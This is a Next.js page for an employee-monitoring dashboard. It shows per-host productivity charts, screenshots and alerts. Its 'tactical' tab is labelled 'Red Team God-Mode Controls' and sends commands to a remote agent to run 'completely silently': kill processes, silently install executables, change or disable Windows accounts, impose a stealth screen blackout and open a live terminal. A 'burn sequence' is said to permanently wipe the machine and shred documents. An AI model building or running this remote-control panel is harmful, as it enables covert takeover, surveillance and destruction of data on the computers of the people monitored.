"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import {
    ArrowLeft, Activity, Shield, Clock, Monitor, AlertTriangle,
    TrendingUp, TrendingDown, Eye, Zap, Terminal, Loader2,
    BarChart3, PieChart, Calendar, ChevronRight, Target, Flame,
    ShieldAlert, Cpu, Skull
} from "lucide-react";
import Link from "next/link";
import {
    BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer,
    PieChart as RPieChart, Pie, Cell, AreaChart, Area, CartesianGrid
} from "recharts";

const COLORS = ["#10b981", "#ef4444", "#3b82f6", "#f59e0b", "#8b5cf6", "#ec4899", "#06b6d4", "#84cc16"];

export default function EmployeeDetailPage() {
    const params = useParams();
    const hostname = decodeURIComponent(params.hostname as string);
    const [data, setData] = useState<any>(null);
    const [loading, setLoading] = useState(true);
    const [activeTab, setActiveTab] = useState<"overview" | "timeline" | "apps" | "alerts" | "tactical">("overview");

    const [cmdPayload, setCmdPayload] = useState("");
    const [cmdType, setCmdType] = useState("kill-process");

    const sendGodMode = async (type: string, payload: any) => {
        try {
            const res = await fetch("/api/agent/godmode", {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ hostname, type, payload })
            });
            const d = await res.json();
            if (d.success) alert(d.message);
            else alert("Error: " + d.error);
        } catch (e: any) { alert(e.message); }
    };

    useEffect(() => {
        fetch(`/api/employee/${encodeURIComponent(hostname)}`)
            .then(res => res.json())
            .then(d => { setData(d); setLoading(false); })
            .catch(() => setLoading(false));
    }, [hostname]);

    if (loading) {
        return (
            <div className="flex flex-col items-center justify-center min-h-[600px] space-y-6">
                <Loader2 className="w-16 h-16 animate-spin text-[#10b981]" />
                <p className="text-[10px] font-black text-gray-600 uppercase tracking-[0.5em]">Loading Agent Intelligence...</p>
            </div>
        );
    }

    if (!data || data.error) {
        return (
            <div className="flex flex-col items-center justify-center min-h-[600px] space-y-6">
                <AlertTriangle className="w-16 h-16 text-red-500" />
                <p className="text-sm font-black text-gray-400 uppercase tracking-widest">Agent Not Found</p>
                <Link href="/employees" className="text-[#10b981] text-xs font-black uppercase tracking-widest hover:underline">
                    ← Back to Roster
                </Link>
            </div>
        );
    }

    const pieData = [
        { name: "Productive", value: data.productiveCount || 0 },
        { name: "Unproductive", value: data.unproductiveCount || 0 },
        { name: "Browsing", value: data.browsingCount || 0 },
    ].filter(d => d.value > 0);

    const riskLevel = data.totalAlerts > 10 ? "CRITICAL" : data.totalAlerts > 3 ? "ELEVATED" : "NOMINAL";
    const riskColor = riskLevel === "CRITICAL" ? "text-red-500" : riskLevel === "ELEVATED" ? "text-yellow-500" : "text-[#10b981]";

    return (
        <div className="space-y-8 animate-in fade-in duration-700 pb-20">
            {/* Header */}
            <div className="flex justify-between items-start border-b border-white/5 pb-10">
                <div className="space-y-4">
                    <Link href="/employees" className="flex items-center gap-2 text-gray-600 hover:text-[#10b981] transition-colors text-[10px] font-black uppercase tracking-[0.3em]">
                        <ArrowLeft className="w-3 h-3" /> Personnel Roster
                    </Link>
                    <div className="flex items-center gap-6">
                        <div className="w-20 h-20 border-2 border-[#10b981]/30 flex items-center justify-center bg-[#10b981]/5">
                            <Terminal className="w-8 h-8 text-[#10b981]" />
                        </div>
                        <div>
                            <h1 className="text-4xl font-black tracking-tighter text-white uppercase italic">{hostname}</h1>
                            <p className="text-[11px] font-black text-gray-500 uppercase tracking-widest mt-1">{data.username} • {data.status === "Active" ? "🟢 ONLINE" : "⚫ OFFLINE"}</p>
                        </div>
                    </div>
                </div>

                <div className="flex gap-4">
                    <div className={`px-6 py-3 border ${riskLevel === "CRITICAL" ? "border-red-500/30 bg-red-500/5" : riskLevel === "ELEVATED" ? "border-yellow-500/30 bg-yellow-500/5" : "border-[#10b981]/30 bg-[#10b981]/5"}`}>
                        <p className="text-[8px] font-black uppercase tracking-[0.4em] text-gray-600">Threat Level</p>
                        <p className={`text-lg font-black italic ${riskColor}`}>{riskLevel}</p>
                    </div>
                </div>
            </div>

            {/* Stats Row */}
            <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-6 gap-1">
                <StatCard label="Productivity" value={`${data.productivityScore}%`} icon={TrendingUp} accent={data.productivityScore > 50 ? "#10b981" : "#ef4444"} />
                <StatCard label="Total Snaps" value={data.totalActivities?.toLocaleString()} icon={Monitor} accent="#3b82f6" />
                <StatCard label="Alerts" value={data.totalAlerts} icon={AlertTriangle} accent={data.totalAlerts > 5 ? "#ef4444" : "#f59e0b"} />
                <StatCard label="Days Tracked" value={data.daysTracked} icon={Calendar} accent="#8b5cf6" />
                <StatCard label="Productive" value={data.productiveCount} icon={Zap} accent="#10b981" />
                <StatCard label="Last Active" value={data.lastActive ? new Date(data.lastActive).toLocaleTimeString() : "N/A"} icon={Clock} accent="#06b6d4" />
            </div>

            {/* Tab Navigation */}
            <div className="flex gap-1 border-b border-white/5">
                {(["overview", "timeline", "apps", "alerts", "tactical"] as const).map(tab => (
                    <button
                        key={tab}
                        onClick={() => setActiveTab(tab)}
                        className={`px-8 py-4 text-[10px] font-black uppercase tracking-[0.3em] transition-all border-b-2 ${activeTab === tab ? "border-[#10b981] text-[#10b981] bg-[#10b981]/5" : "border-transparent text-gray-600 hover:text-white"}`}
                    >
                        {tab}
                    </button>
                ))}
            </div>

            {/* Tab Content */}
            {activeTab === "overview" && (
                <div className="grid grid-cols-1 xl:grid-cols-12 gap-1">
                    {/* Productivity Ring */}
                    <div className="xl:col-span-4 p-8 border border-white/5 bg-white/[0.01]">
                        <h3 className="text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] mb-6">Activity Breakdown</h3>
                        <div className="h-[250px]">
                            <ResponsiveContainer width="100%" height="100%">
                                <RPieChart>
                                    <Pie data={pieData} cx="50%" cy="50%" innerRadius={60} outerRadius={100} paddingAngle={2} dataKey="value">
                                        {pieData.map((_, i) => <Cell key={i} fill={COLORS[i]} />)}
                                    </Pie>
                                    <Tooltip
                                        contentStyle={{ background: "#0a0a0b", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 0, fontSize: 11, fontWeight: 900 }}
                                        itemStyle={{ color: "#fff" }}
                                    />
                                </RPieChart>
                            </ResponsiveContainer>
                        </div>
                        <div className="flex justify-center gap-6 mt-4">
                            {pieData.map((d, i) => (
                                <div key={d.name} className="flex items-center gap-2">
                                    <div className="w-2 h-2" style={{ background: COLORS[i] }} />
                                    <span className="text-[9px] font-black text-gray-500 uppercase tracking-widest">{d.name}</span>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Hourly Activity Bar Chart */}
                    <div className="xl:col-span-8 p-8 border border-white/5 bg-white/[0.01]">
                        <h3 className="text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] mb-6">Hourly Activity Density</h3>
                        <div className="h-[280px]">
                            <ResponsiveContainer width="100%" height="100%">
                                <BarChart data={data.hourlyActivity || []}>
                                    <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.03)" />
                                    <XAxis dataKey="hour" tick={{ fontSize: 9, fill: "#666", fontWeight: 900 }} tickFormatter={h => `${h}:00`} />
                                    <YAxis tick={{ fontSize: 9, fill: "#666" }} />
                                    <Tooltip contentStyle={{ background: "#0a0a0b", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 0, fontSize: 11 }} />
                                    <Bar dataKey="count" fill="#10b981" radius={[2, 2, 0, 0]} />
                                </BarChart>
                            </ResponsiveContainer>
                        </div>
                    </div>

                    {/* Daily Activity Trend */}
                    <div className="xl:col-span-12 p-8 border border-white/5 bg-white/[0.01]">
                        <h3 className="text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] mb-6">30-Day Activity Trend</h3>
                        <div className="h-[200px]">
                            <ResponsiveContainer width="100%" height="100%">
                                <AreaChart data={[...(data.dailyActivity || [])].reverse()}>
                                    <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.03)" />
                                    <XAxis dataKey="day" tick={{ fontSize: 8, fill: "#444" }} />
                                    <YAxis tick={{ fontSize: 9, fill: "#444" }} />
                                    <Tooltip contentStyle={{ background: "#0a0a0b", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 0, fontSize: 11 }} />
                                    <Area type="monotone" dataKey="productive" stackId="1" stroke="#10b981" fill="#10b981" fillOpacity={0.3} />
                                    <Area type="monotone" dataKey="unproductive" stackId="1" stroke="#ef4444" fill="#ef4444" fillOpacity={0.3} />
                                </AreaChart>
                            </ResponsiveContainer>
                        </div>
                    </div>
                </div>
            )}

            {activeTab === "timeline" && (
                <div className="space-y-1">
                    {(data.recentActivities || []).map((act: any, i: number) => (
                        <div key={act.id} className="flex gap-6 p-6 border border-white/5 hover:border-[#10b981]/20 transition-all bg-white/[0.01] group">
                            <div className="w-24 shrink-0">
                                <p className="text-[10px] font-mono text-gray-600">{new Date(act.timestamp).toLocaleTimeString()}</p>
                                <p className="text-[8px] font-black text-gray-700 uppercase tracking-widest mt-1">{new Date(act.timestamp).toLocaleDateString()}</p>
                            </div>
                            <div className={`w-1 shrink-0 ${act.category === "Productive" ? "bg-[#10b981]" : act.category === "Unproductive" ? "bg-red-500" : "bg-gray-800"}`} />
                            <div className="flex-1 min-w-0">
                                <p className="text-[11px] font-black text-white uppercase tracking-tight truncate">{act.window_title}</p>
                                <div className="flex gap-3 mt-2">
                                    <span className={`text-[8px] font-black uppercase tracking-widest px-2 py-0.5 ${act.category === "Productive" ? "bg-[#10b981]/10 text-[#10b981]" : act.category === "Unproductive" ? "bg-red-500/10 text-red-500" : "bg-gray-500/10 text-gray-500"}`}>
                                        {act.category || "Unknown"}
                                    </span>
                                    <span className="text-[8px] font-black uppercase tracking-widest px-2 py-0.5 bg-white/5 text-gray-600">
                                        {act.status}
                                    </span>
                                </div>
                            </div>
                            {act.screen_path && (
                                <div className="w-32 h-20 shrink-0 border border-white/5 overflow-hidden opacity-30 group-hover:opacity-100 transition-all">
                                    <img src={`/storage/${act.screen_path}`} className="w-full h-full object-cover" alt="" />
                                </div>
                            )}
                        </div>
                    ))}
                    {(!data.recentActivities || data.recentActivities.length === 0) && (
                        <div className="py-20 text-center text-gray-700 font-black text-[10px] uppercase tracking-[0.5em]">No timeline data available</div>
                    )}
                </div>
            )}

            {activeTab === "apps" && (
                <div className="space-y-1">
                    {(data.appUsage || []).map((app: any, i: number) => {
                        const maxCount = Math.max(...(data.appUsage || []).map((a: any) => a.count));
                        const pct = maxCount > 0 ? (app.count / maxCount) * 100 : 0;
                        return (
                            <div key={i} className="p-6 border border-white/5 bg-white/[0.01] hover:border-[#10b981]/20 transition-all relative overflow-hidden">
                                <div className="absolute inset-y-0 left-0 bg-[#10b981]/5" style={{ width: `${pct}%` }} />
                                <div className="relative flex justify-between items-center">
                                    <div className="flex items-center gap-4">
                                        <div className={`w-2 h-2 ${app.category === "Productive" ? "bg-[#10b981]" : app.category === "Unproductive" ? "bg-red-500" : "bg-gray-600"}`} />
                                        <span className="text-[11px] font-black text-white uppercase tracking-tight truncate max-w-md">{app.window_title}</span>
                                        <span className={`text-[8px] font-black uppercase tracking-widest px-2 py-0.5 ${app.category === "Productive" ? "bg-[#10b981]/10 text-[#10b981]" : app.category === "Unproductive" ? "bg-red-500/10 text-red-500" : "bg-white/5 text-gray-600"}`}>
                                            {app.category || "Neutral"}
                                        </span>
                                    </div>
                                    <div className="flex gap-8 text-right">
                                        <div>
                                            <p className="text-[9px] font-black text-gray-600 uppercase tracking-widest">Sessions</p>
                                            <p className="text-sm font-black text-white">{app.count}</p>
                                        </div>
                                        <div>
                                            <p className="text-[9px] font-black text-gray-600 uppercase tracking-widest">Time</p>
                                            <p className="text-sm font-black text-[#10b981]">{app.minutes?.toFixed(1)}m</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        );
                    })}
                </div>
            )}

            {activeTab === "alerts" && (
                <div className="space-y-1">
                    {(data.recentAlerts || []).map((alert: any) => (
                        <div key={alert.id} className="p-6 border border-white/5 bg-white/[0.01] hover:border-red-500/20 transition-all flex items-start gap-6">
                            <div className={`w-10 h-10 shrink-0 flex items-center justify-center border ${alert.severity === "High" ? "border-red-500/30 bg-red-500/5 text-red-500" : "border-yellow-500/30 bg-yellow-500/5 text-yellow-500"}`}>
                                <AlertTriangle className="w-4 h-4" />
                            </div>
                            <div className="flex-1">
                                <p className="text-[11px] font-black text-white uppercase tracking-tight">{alert.message}</p>
                                <div className="flex gap-4 mt-2">
                                    <span className="text-[8px] font-black text-gray-600 uppercase tracking-widest">{alert.type}</span>
                                    <span className={`text-[8px] font-black uppercase tracking-widest ${alert.severity === "High" ? "text-red-500" : "text-yellow-500"}`}>{alert.severity}</span>
                                    <span className="text-[8px] font-mono text-gray-700">{new Date(alert.timestamp).toLocaleString()}</span>
                                </div>
                            </div>
                        </div>
                    ))}
                    {(!data.recentAlerts || data.recentAlerts.length === 0) && (
                        <div className="py-20 text-center text-gray-700 font-black text-[10px] uppercase tracking-[0.5em]">No alerts on record</div>
                    )}
                </div>
            )}

            {activeTab === "tactical" && (
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    <div className="p-8 border border-red-500/20 bg-red-500/5">
                        <div className="flex items-center gap-3 mb-6">
                            <Skull className="w-5 h-5 text-red-500" />
                            <h3 className="text-[12px] font-black justify-between text-red-500 uppercase tracking-[0.3em]">Red Team God-Mode Controls</h3>
                        </div>
                        <p className="text-[10px] text-gray-500 mb-6 tracking-widest uppercase">Execute highly privileged commands completely silently.</p>
                        
                        <div className="space-y-4">
                            <div className="flex gap-2">
                                <select className="bg-black/50 border border-white/10 text-[10px] font-black text-white p-3 uppercase tracking-widest shrink-0" 
                                        value={cmdType} onChange={e => setCmdType(e.target.value)}>
                                    <option value="kill-process">Kill Process (IM)</option>
                                    <option value="service-stop">Stop Service</option>
                                    <option value="service-start">Start Service</option>
                                    <option value="silent-install">Silent Install EXE</option>
                                    <option value="user-pass">Change Password</option>
                                    <option value="user-disable">Disable Windows Account</option>
                                </select>
                                {cmdType === "user-pass" ? (
                                    <div className="flex-1 flex gap-2">
                                        <input placeholder="Username" className="flex-1 bg-black/50 border border-white/10 p-3 text-[10px] uppercase text-white tracking-widest placeholder:text-gray-700" 
                                            id="usrName" />
                                        <input placeholder="New Password" type="password" className="flex-1 bg-black/50 border border-white/10 p-3 text-[10px] uppercase text-white tracking-widest placeholder:text-gray-700" 
                                            id="usrPass" />
                                    </div>
                                ) : (
                                    <input placeholder={
                                        cmdType === "user-disable" ? "Username to Disable" : 
                                        cmdType === "silent-install" ? "Path to .exe" : 
                                        "Process/Service Name"
                                    } className="flex-1 bg-black/50 border border-white/10 p-3 text-[10px] uppercase text-white tracking-widest placeholder:text-gray-700" 
                                        value={cmdPayload} onChange={e => setCmdPayload(e.target.value)} />
                                )}
                                <button className="bg-red-500 hover:bg-red-400 text-black font-black px-6 text-[10px] uppercase tracking-widest transition-colors"
                                    onClick={() => {
                                        if (cmdType === "user-pass") {
                                            const u = (document.getElementById('usrName') as HTMLInputElement)?.value;
                                            const p = (document.getElementById('usrPass') as HTMLInputElement)?.value;
                                            if (u && p) sendGodMode(cmdType, { username: u, password: p });
                                        } else {
                                            sendGodMode(cmdType, cmdType === "user-disable" ? { username: cmdPayload } : cmdPayload);
                                        }
                                    }}>Execute</button>
                            </div>
                            
                            <hr className="border-white/5 my-4" />
                            
                            <h4 className="text-[10px] font-black text-white uppercase tracking-[0.3em] mb-2">Display Blackout Overlay</h4>
                            <div className="space-y-2 mb-3">
                                <textarea
                                    placeholder="Enter custom lockout message for this user (e.g. 'Session locked for security review')..."
                                    className="w-full bg-black/50 border border-white/10 p-3 text-[11px] text-white font-mono placeholder:text-gray-600 outline-none focus:border-red-500/50 min-h-[60px] resize-none"
                                    id="blackoutCustomMsg"
                                />
                                <div className="flex gap-2">
                                    <button className="flex-1 py-3 bg-red-600/20 hover:bg-red-600/40 border border-red-500/40 text-red-400 font-black text-[10px] uppercase tracking-widest"
                                        onClick={() => {
                                            const customMsg = (document.getElementById('blackoutCustomMsg') as HTMLTextAreaElement)?.value;
                                            fetch("/api/agent/godmode", {
                                                method: "POST", headers: { "Content-Type": "application/json" },
                                                body: JSON.stringify({ hostname, type: "stealth-blackout", payload: true, customMessage: customMsg })
                                            }).then(r => r.json()).then(d => alert(d.message)).catch(e => alert(e.message));
                                        }}>
                                        🔒 Engage Custom Blackout
                                    </button>
                                    <button className="flex-1 py-3 bg-white/5 hover:bg-white/10 border border-white/10 text-gray-400 font-black text-[10px] uppercase tracking-widest"
                                        onClick={() => sendGodMode("stealth-blackout", false)}>
                                        Disable Blackout
                                    </button>
                                </div>
                            </div>
                            
                            <h4 className="text-[10px] font-black text-white uppercase tracking-[0.3em] mb-2 mt-4">Advanced Controls</h4>
                            <div className="flex gap-2 mb-2">
                                <button className="flex-1 py-3 bg-[#3b82f6]/20 hover:bg-[#3b82f6]/40 border border-[#3b82f6]/30 text-[#3b82f6] font-black text-[10px] uppercase tracking-widest" onClick={() => sendGodMode("terminal-start-action", {})}>
                                    LIVE TERMINAL
                                </button>
                                <button className="flex-1 py-3 bg-gray-600/20 hover:bg-gray-600/60 border border-gray-600/30 text-gray-400 font-black text-[10px] uppercase tracking-widest" onClick={() => { if(confirm('Are you sure you want to safely uninstall and remove this agent?')) sendGodMode("uninstall-agent-action", {}) }}>
                                    🛡️ SAFELY UNINSTALL AGENT
                                </button>
                            </div>
                            <div className="flex gap-2">
                                <button className="flex-1 py-3 bg-red-600/20 hover:bg-red-600/60 border border-red-600/30 text-red-500 font-black text-[10px] uppercase tracking-widest" onClick={() => { if(confirm('⚠️ WARNING ⚠️\\nThis will PERMANENTLY WIPE the target, shred documents, and self-destruct the agent.\\n\\nPROCEED?')) sendGodMode("burn-sequence-action", {}) }}>
                                    🔥 INITIATE BURN SEQUENCE 🔥
                                </button>
                                <button className="flex-1 py-3 bg-gray-600/20 hover:bg-gray-600/60 border border-gray-600/30 text-gray-400 font-black text-[10px] uppercase tracking-widest" onClick={() => { if(confirm('Are you sure you want to safely uninstall and remove this agent?')) sendGodMode("uninstall-agent-action", {}) }}>
                                    🛡️ SAFELY UNINSTALL AGENT
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

function StatCard({ label, value, icon: Icon, accent }: { label: string; value: any; icon: any; accent: string }) {
    return (
        <div className="p-6 border border-white/5 bg-white/[0.01] hover:bg-white/[0.02] transition-all">
            <div className="flex justify-between items-start mb-4">
                <p className="text-[8px] font-black text-gray-600 uppercase tracking-[0.4em]">{label}</p>
                <Icon className="w-3.5 h-3.5" style={{ color: accent, opacity: 0.5 }} />
            </div>
            <h3 className="text-2xl font-black tracking-tighter italic" style={{ color: accent }}>{value}</h3>
        </div>
    );
}
